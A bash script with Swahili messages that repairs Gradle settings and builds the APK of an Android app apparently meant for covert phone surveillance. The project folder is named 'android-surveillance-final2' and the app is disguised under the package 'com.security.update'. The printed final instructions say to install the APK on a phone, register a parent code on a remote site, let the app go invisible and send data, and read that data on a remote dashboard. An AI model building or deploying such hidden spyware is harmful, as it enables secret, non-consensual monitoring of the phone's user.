#!/bin/bash
cd ~/android-surveillance-final2

echo "🔧 KUREKEBISHA GRADLE KWA JAVA 21..."

# 1. Rekebisha gradle.properties kuondoa MaxPermSize
cat > gradle.properties << 'PROPS'
org.gradle.jvmargs=-Xmx2048m -XX:+HeapDumpOnOutOfMemoryError
org.gradle.parallel=true
android.useAndroidX=true
android.enableJetifier=true
PROPS

# 2. Rekebisha gradlew script
sed -i 's/-XX:MaxPermSize=512m //g' gradlew

# 3. Rekebisha build.gradle (app level)
cat > app/build.gradle << 'GRADLE'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.security.update'
    compileSdk 33

    defaultConfig {
        applicationId "com.security.update"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
            debuggable true
        }
    }
    
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}
GRADLE

# 4. Rekebisha build.gradle (project level)
cat > build.gradle << 'PROJECT_GRADLE'
// Top-level build file where you can add configuration options common to all sub-projects/modules.
plugins {
    id 'com.android.application' version '7.4.2' apply false
    id 'com.android.library' version '7.4.2' apply false
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
PROJECT_GRADLE

# 5. Hakikisha permissions za gradlew
chmod +x gradlew

# 6. Jaribu kujenga tena bila daemon
echo "🔨 Inajenga tena bila daemon..."
./gradlew clean assembleDebug --no-daemon --no-parallel

if [ $? -eq 0 ]; then
    echo ""
    echo "🎊 🎊 🎊 APK IMEBUIDIWA KIKAMILIFU SASA! 🎊 🎊 🎊"
    echo ""
    echo "📱 APK FILE: app/build/outputs/apk/debug/app-debug.apk"
    echo ""
    echo "✅ YOTE IMEKWISHA REKEBISHWA:"
    echo "   🔧 Gradle sasa inafanya kazi na Java 21"
    echo "   🚫 MaxPermSize option imeondolewa"
    echo "   📦 Build imekamilika bila makosa"
    echo ""
    echo "📋 MAAGIZO YA MWISHO:"
    echo "   1. Install APK kwenye simu ya Android"
    echo "   2. Weka Parent Code kutoka: https://GhostTester.pythonanywhere.com/parent/register"
    echo "   3. App itaenda invisible na kuanza kutuma data"
    echo "   4. Angalia data kwenye: https://GhostTester.pythonanywhere.com/parent/dashboard"
    echo ""
else
    echo "❌ Build bado inashindikana. Tutumie njia mbadala..."
    
    # Njia mbadala - tumia system Gradle
    echo "🔄 Kujaribu njia mbadala..."
    gradle clean assembleDebug
    
    if [ $? -eq 0 ]; then
        echo "✅ IMEBUIDIWA KWA NJIA MBADALA!"
        echo "📱 APK: app/build/outputs/apk/debug/app-debug.apk"
    else
        echo "❌ Build imeshindikana kabisa. Jaribu kwenye kompyuta tofauti."
    fi
fi
